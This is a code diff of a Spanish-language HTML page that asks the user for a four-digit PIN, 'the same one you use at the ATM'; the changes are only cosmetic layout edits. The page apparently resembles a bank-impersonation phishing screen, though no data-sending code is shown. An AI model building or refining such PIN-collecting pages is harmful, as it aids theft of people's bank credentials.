@@ -66,12 +66,11 @@
     <br>
 
     <img src="img/logo.png" alt="" srcset="" width="100%">
-
+<br>
     <br>
     <a style="font-size:30px; color:#fff;">Ingresa tu clave</a>
 </center>
 
-<br>
 
 <div class="contenido" style="width:90%; border-radius:30px; border: none; background-color:#454648; height:290px; padding:20px; margin:auto;">
 
@@ -80,13 +79,12 @@
     <a style="font-size:16px; text-align:center; color:#fff;">Es la misma que utilizas en el cajero</a>
     <br>
     <br>
-    <input type="text" name="user" id="txtPassword" placeholder="****" style="border:none; width:90%;height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="4" minlenght="4">
+    <input type="text" name="user" id="txtPassword" placeholder="****" style="border:none; width:90%; height:35px; background: transparent; border-bottom:2px solid #fff; padding.left:15px; text-align:center;" maxlength="4" minlenght="4">
     <br>
 </center>
+    <a style="position:absolute; color:#fff; right: 10%; margin-top:6px"><small>¿olvidaste tu clave?</small></a>
+
 <br>
-<div class="forget-text">
-    <a style="position:absolute; color:#fff;">¿olvidaste tu clave?</a>
-</div>
 <br>
 <br>
 <center>
